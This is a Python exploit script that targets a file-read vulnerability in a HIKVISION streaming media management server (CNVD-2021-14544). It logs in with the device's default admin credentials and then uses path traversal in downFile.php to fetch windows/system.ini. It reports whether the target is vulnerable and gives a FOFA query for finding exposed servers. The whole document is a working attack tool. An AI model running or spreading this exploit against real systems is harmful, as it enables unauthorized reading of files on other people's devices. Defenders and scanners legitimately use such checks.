#!/bin/usr/env python3
# _*_ coding:utf-8 _*_

import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
def title():
    print('+    fofa:   title="流媒体管理服务器"')
    print('+    Info:   HIKVISION 流媒体管理服务器 后台任意文件读取漏洞 CNVD-2021-14544')
def run_proto(url):

    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    headers = {
        'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36'
              }
    try:
        session = requests.session()
        session.post(url=url + '/data/login.php', data={'userName':'YWRtaW4=','password':'MTIzNDU='}, headers=headers, timeout=3,  verify=False)
        session.get(url=url + '/main.php', headers=headers, proxies={'http':'http://127.0.0.1:8888'},  verify=False)

        response = session.get(url+'/systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/system.ini', headers=headers, timeout=3,  verify=False)
        if response.status_code == 200 and '[drivers]' in response.text:
            return True
        else:
            return False
    except Exception as e:
        return False


def run(ip, port):
    i = 0
    proto = ['http']
    while i < 1:
        url = '{}://{}:{}'.format(proto[i], ip, port)
        if run_proto(url):
            return True
        else:
            i = i + 1

if __name__ == '__main__':
    title()
    target = sys.argv[1]
    ip = target.split(':')[0]
    port = target.split(':')[1]

    result = run(ip, port)

    if result:
        print('Exist')
    else:
        print('UnExist')
